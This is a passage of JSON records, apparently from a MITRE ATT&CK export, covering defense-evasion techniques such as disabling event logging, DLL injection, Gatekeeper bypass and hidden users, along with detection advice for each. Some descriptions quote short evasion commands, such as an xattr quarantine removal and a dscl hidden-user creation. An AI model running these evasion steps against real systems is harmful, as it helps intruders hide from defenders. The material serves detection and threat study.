11:56:01","pivot":{"technique_id":567,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":569,"name":"T1562.002 - Disable Windows Event Logging","sort_id":0,"external_id":"T1562.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.<\/p>\n<p>Adversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments for commands that can be used to disable logging. Lack of event logs may be suspicious.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":569,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":570,"name":"T1562.007 - Disable or Modify Cloud Firewall","sort_id":0,"external_id":"T1562.007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1562\/004\">Disable or Modify System Firewall<\/a>. <\/p>\n<p>Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP\/IP connectivity.(Citation: Expel IO Evil in AWS)<\/p>\n<p>Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and\/or data exfiltration that would otherwise not be allowed.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor cloud logs for modification or creation of new security groups or firewall rules.","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":570,"platform_id":6,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":570,"platform_id":7,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":570,"platform_id":8,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":571,"name":"T1562.004 - Disable or Modify System Firewall","sort_id":0,"external_id":"T1562.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.<\/p>\n<p>Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and\/or data exfiltration that would otherwise not be allowed. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments to see if firewalls are disabled or modified. Monitor Registry edits to keys that manage firewalls.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":571,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":571,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":571,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":572,"name":"T1562.001 - Disable or Modify Tools","sort_id":0,"external_id":"T1562.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":572,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":572,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":572,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":579,"name":"T1078.002 - Domain Accounts","sort_id":0,"external_id":"T1078.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)<\/p>\n<p>Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a> or password reuse, allowing access to privileged resources of the domain.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":579,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":579,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":579,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":587,"name":"T1055.001 - Dynamic-link Library Injection","sort_id":0,"external_id":"T1055.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  <\/p>\n<p>DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx<\/code> and <code>WriteProcessMemory<\/code>, then invoked with <code>CreateRemoteThread<\/code> (which calls the <code>LoadLibrary<\/code> API responsible for loading the DLL). (Citation: Endgame Process Injection July 2017) <\/p>\n<p>Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary<\/code>).(Citation: Endgame HuntingNMemory June 2017)(Citation: Endgame Process Injection July 2017) <\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread<\/code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx<\/code>\/<code>WriteProcessMemory<\/code>, may be used for this technique.(Citation: Endgame Process Injection July 2017)\n\nMonitor DLL\/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":587,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":593,"name":"T1480.001 - Environmental Keying","sort_id":0,"external_id":"T1480.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1480\">Execution Guardrails<\/a> that utilizes cryptographic techniques for deriving encryption\/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)<\/p>\n<p>Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software\/software versions, files, joined AD domains, system time, and local\/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1027\">Obfuscated Files or Information<\/a>, adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.<\/p>\n<p>Like other <a href=\"https:\/\/attack.mitre.org\/techniques\/T1480\">Execution Guardrails<\/a>, environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a>. While use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a> may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https:\/\/attack.mitre.org\/tactics\/TA0007), especially in a short period of time, may aid in detection.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":593,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":593,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":593,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":607,"name":"T1055.011 - Extra Window Memory Injection","sort_id":0,"external_id":"T1055.011","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. <\/p>\n<p>Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input\/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)<\/p>\n<p>Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.<\/p>\n<p>Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory<\/code> and <code>CreateRemoteThread<\/code>.(Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)<\/p>\n<p>Running code in the context of another process may allow access to the process's memory, system\/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Endgame Process Injection July 2017)","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":607,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":609,"name":"T1070.004 - File Deletion","sort_id":0,"external_id":"T1070.004","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.<\/p>\n<p>There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":609,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":609,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":609,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":612,"name":"T1553.001 - Gatekeeper Bypass","sort_id":0,"external_id":"T1553.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called <code>com.apple.quarantine<\/code>. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. <\/p>\n<p>Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network won\u2019t set this flag. Additionally, it is possible to avoid setting this flag using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1189\">Drive-by Compromise<\/a>. This completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware Persistence) The presence of the quarantine flag can be checked by the xattr command <code>xattr \/path\/to\/MyApp.app<\/code> for <code>com.apple.quarantine<\/code>. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, <code>sudo xattr -r -d com.apple.quarantine \/path\/to\/MyApp.app<\/code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus for OS X)<\/p>\n<p>In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOS\u2019s gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitoring for the removal of the <code>com.apple.quarantine<\/code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr<\/code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":612,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":615,"name":"T1562.003 - HISTCONTROL","sort_id":0,"external_id":"T1562.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may configure <code>HISTCONTROL<\/code> to not log all command history. The <code>HISTCONTROL<\/code> environment variable keeps track of what should be saved by the <code>history<\/code> command and eventually into the <code>~\/.bash_history<\/code> file when a user logs out. <code>HISTCONTROL<\/code> does not exist by default on macOS, but can be set by the user and will be respected.<\/p>\n<p>This setting can be configured to ignore commands that start with a space by simply setting it to &quot;ignorespace&quot;. <code>HISTCONTROL<\/code> can also be set to ignore duplicate commands by setting it to &quot;ignoredups&quot;. In some Linux systems, this is set by default to &quot;ignoreboth&quot; which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history.<\/p>\n<p>Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Correlating a user session with a distinct lack of new commands in their <code>.bash_history<\/code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL<\/code> environment variable is also suspicious.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":615,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":615,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":616,"name":"T1564.005 - Hidden File System","sort_id":0,"external_id":"T1564.005","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)<\/p>\n<p>Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input\/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https:\/\/attack.mitre.org\/techniques\/T1542\/003) activity.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":616,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":616,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":616,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":617,"name":"T1564.001 - Hidden Files and Directories","sort_id":0,"external_id":"T1564.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir \/a<\/code> for Windows and <code>ls \u2013a<\/code> for Linux and macOS).<\/p>\n<p>On Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.<\/p>\n<p>Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.<\/p>\n<p>Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":617,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":617,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":617,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":618,"name":"T1564.002 - Hidden Users","sort_id":0,"external_id":"T1564.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account.<\/p>\n<p>There is a property value in <code>\/Library\/Preferences\/com.apple.loginwindow<\/code> called <code>Hide500Users<\/code> that prevents users with userIDs 500 and lower from appearing at the login screen. When using the <a href=\"https:\/\/attack.mitre.org\/techniques\/T1136\">Create Account<\/a> technique with a userID under 500 (ex: <code>sudo dscl . -create \/Users\/username UniqueID 401<\/code>) and enabling this property (setting it to Yes), an adversary can conceal user accounts. (Citation: Cybereason OSX Pirrit).<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"This technique prevents the new user from showing up at the log in screen, but all of the other signs of a new user still exist. The user still gets a home directory and will appear in the authentication logs.","platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":618,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":619,"name":"T1564.003 - Hidden Window","sort_id":0,"external_id":"T1564.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. <\/p>\n<p>On Windows, there are a variety of features in scripting languages in Windows, such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>, Jscript, and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/005\">Visual Basic<\/a> to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden<\/code>. (Citation: PowerShell About 2019)<\/p>\n<p>Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be 